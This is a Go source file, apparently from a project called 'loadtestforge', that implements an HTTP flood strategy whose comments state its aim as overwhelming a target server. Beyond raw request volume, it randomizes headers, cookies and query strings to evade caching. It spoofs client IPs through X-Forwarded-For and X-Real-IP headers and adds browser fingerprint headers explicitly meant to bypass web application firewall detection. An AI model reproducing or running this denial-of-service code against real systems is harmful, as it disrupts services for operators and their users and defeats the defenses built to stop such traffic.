package strategy

import (
	"bytes"
	"context"
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"sync/atomic"
	"time"

	"github.com/srtdog64/loadtestforge/internal/config"
	"github.com/srtdog64/loadtestforge/internal/httpdata"
	"github.com/srtdog64/loadtestforge/internal/netutil"
)

// HTTPFlood implements high-volume HTTP request flooding.
// It sends as many HTTP requests as possible to overwhelm the target server.
type HTTPFlood struct {
	BaseStrategy
	client          *http.Client
	timeout         time.Duration
	method          string
	postDataSize    int
	requestsPerConn int
	requestsSent    int64
	cookiePool      []string
}

// NewHTTPFlood creates a new HTTPFlood strategy.
func NewHTTPFlood(timeout time.Duration, method string, postDataSize int, requestsPerConn int, bindIP string, enableStealth bool, randomizePath bool) *HTTPFlood {
	common := DefaultCommonConfig()
	common.ConnectTimeout = timeout
	common.EnableStealth = enableStealth
	common.RandomizePath = randomizePath

	h := &HTTPFlood{
		BaseStrategy:    NewBaseStrategy(bindIP, common),
		timeout:         timeout,
		method:          method,
		postDataSize:    postDataSize,
		requestsPerConn: requestsPerConn,
		cookiePool:      generateCookiePool(50),
	}

	dialerCfg := netutil.DialerConfig{
		Timeout:       30 * time.Second,
		KeepAlive:     30 * time.Second,
		LocalAddr:     netutil.NewLocalTCPAddr(bindIP),
		BindConfig:    netutil.NewBindConfig(bindIP),
		TLSSkipVerify: true,
	}

	transport := netutil.NewTrackedTransport(dialerCfg, &h.activeConnections)

	h.client = &http.Client{
		Timeout:   timeout,
		Transport: transport,
	}

	return h
}

// NewHTTPFloodWithConfig creates an HTTPFlood strategy from StrategyConfig.
func NewHTTPFloodWithConfig(cfg *config.StrategyConfig, bindIP string, method string) *HTTPFlood {
	return NewHTTPFlood(
		cfg.Timeout,
		method,
		cfg.PostDataSize,
		cfg.RequestsPerConn,
		bindIP,
		cfg.EnableStealth,
		cfg.RandomizePath,
	)
}

// generateCookiePool creates a pool of realistic session cookies
func generateCookiePool(size int) []string {
	pool := make([]string, size)
	for i := 0; i < size; i++ {
		hash := md5.Sum([]byte(fmt.Sprintf("%d%d", time.Now().UnixNano(), i)))
		pool[i] = fmt.Sprintf("session_%d=%s", i, hex.EncodeToString(hash[:])[:16])
	}
	return pool
}

func (h *HTTPFlood) Execute(ctx context.Context, target Target) error {
	// Parse URL once at the start of execution (Performance optimization)
	parsedURL, err := url.Parse(target.URL)
	if err != nil {
		return fmt.Errorf("failed to parse target URL: %w", err)
	}

	for i := 0; i < h.requestsPerConn; i++ {
		select {
		case <-ctx.Done():
			return nil
		default:
		}

		if err := h.sendRequest(ctx, target, parsedURL); err != nil {
			return err
		}
	}
	return nil
}

func (h *HTTPFlood) sendRequest(ctx context.Context, target Target, parsedURL *url.URL) error {
	reqCtx, cancel := context.WithTimeout(ctx, h.timeout)
	defer cancel()

	var body io.Reader
	if h.method == "POST" && h.postDataSize > 0 {
		postData := h.generatePostData()
		body = bytes.NewReader(postData)
	}

	var targetURL string
	if h.IsPathRandomized() {
		targetURL = h.generateRealisticURL(parsedURL)
	} else {
		targetURL = fmt.Sprintf("%s?r=%d&cb=%d", target.URL, rand.Intn(100000000), rand.Intn(1000000))
	}

	req, err := http.NewRequestWithContext(reqCtx, h.method, targetURL, body)
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}

	h.applyRandomHeaders(req)

	if h.IsStealthEnabled() {
		h.applyStealthHeaders(req)
	}

	if h.method == "POST" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	for k, v := range target.Headers {
		req.Header.Set(k, v)
	}

	startTime := time.Now()
	resp, err := h.client.Do(req)
	latency := time.Since(startTime)

	if err != nil {
		return fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	io.Copy(io.Discard, resp.Body)

	atomic.AddInt64(&h.requestsSent, 1)

	if resp.StatusCode >= 400 {
		return fmt.Errorf("http error: %d", resp.StatusCode)
	}

	h.RecordLatency(latency)

	return nil
}

// applyRandomHeaders applies randomized headers to mimic real browser traffic
func (h *HTTPFlood) applyRandomHeaders(req *http.Request) {
	req.Header.Set("User-Agent", httpdata.RandomUserAgent())
	req.Header.Set("Referer", httpdata.RandomReferer())
	req.Header.Set("Accept", httpdata.RandomAccept())
	req.Header.Set("Accept-Language", httpdata.RandomAcceptLanguage())
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Cache-Control", httpdata.RandomCacheControl())
	req.Header.Set("Connection", "keep-alive")

	// 40% probability: Add X-Forwarded-For header
	if rand.Float32() < 0.4 {
		req.Header.Set("X-Forwarded-For", httpdata.RandomFakeIP())
	}

	// 30% probability: Add random session cookie
	if rand.Float32() < 0.3 {
		req.Header.Set("Cookie", h.cookiePool[rand.Intn(len(h.cookiePool))])
	}

	// 20% probability: Add X-Requested-With (AJAX request)
	if rand.Float32() < 0.2 {
		req.Header.Set("X-Requested-With", "XMLHttpRequest")
	}

	// 15% probability: Add DNT header
	if rand.Float32() < 0.15 {
		req.Header.Set("DNT", "1")
	}
}

// applyStealthHeaders adds modern browser fingerprint headers to bypass WAF detection.
func (h *HTTPFlood) applyStealthHeaders(req *http.Request) {
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", httpdata.RandomSecFetchSite())
	req.Header.Set("Sec-Fetch-User", "?1")

	// Client Hints (Chrome 121+)
	chromeVer := httpdata.RandomChromeVersion()
	req.Header.Set("Sec-CH-UA", fmt.Sprintf(`"Chromium";v="%s", "Google Chrome";v="%s", "Not-A.Brand";v="99"`, chromeVer, chromeVer))
	req.Header.Set("Sec-CH-UA-Mobile", httpdata.RandomMobile())
	req.Header.Set("Sec-CH-UA-Platform", fmt.Sprintf(`"%s"`, httpdata.RandomPlatform()))

	// 50% probability: Add X-Forwarded-For (IP spoofing)
	if rand.Float32() < 0.5 {
		req.Header.Set("X-Forwarded-For", httpdata.RandomFakeIP())
	}

	// 30% probability: Add X-Real-IP
	if rand.Float32() < 0.3 {
		req.Header.Set("X-Real-IP", httpdata.RandomFakeIP())
	}
}

// generateRealisticURL creates a URL with realistic query parameters
// Uses pre-parsed URL to avoid repeated parsing overhead
func (h *HTTPFlood) generateRealisticURL(baseURL *url.URL) string {
	// Create a shallow copy to avoid mutating the original
	u := *baseURL
	q := u.Query()

	q.Set("_", fmt.Sprintf("%d", time.Now().UnixMilli()))
	q.Set("r", fmt.Sprintf("%d", rand.Intn(1000000)))
	q.Set("v", fmt.Sprintf("%d", rand.Intn(100)+1))
	q.Set("ref", httpdata.RandomRefSource())

	cacheOptions := []string{"true", "false"}
	q.Set("cache", cacheOptions[rand.Intn(len(cacheOptions))])

	if rand.Float32() < 0.2 {
		q.Set("user_id", fmt.Sprintf("%d", rand.Intn(9000)+1000))
		q.Set("device", httpdata.RandomDeviceType())
	}

	if rand.Float32() < 0.15 {
		q.Set("session", httpdata.GenerateSessionID())
	}

	if rand.Float32() < 0.1 {
		q.Set("utm_source", httpdata.RandomUTMSource())
	}

	u.RawQuery = q.Encode()
	return u.String()
}

func (h *HTTPFlood) generatePostData() []byte {
	chars := "abcdefghijklmnopqrstuvwxyz0123456789"
	data := make([]byte, h.postDataSize)
	for i := range data {
		data[i] = chars[rand.Intn(len(chars))]
	}
	return data
}

func (h *HTTPFlood) Name() string {
	return "http-flood"
}

func (h *HTTPFlood) RequestsSent() int64 {
	return atomic.LoadInt64(&h.requestsSent)
}
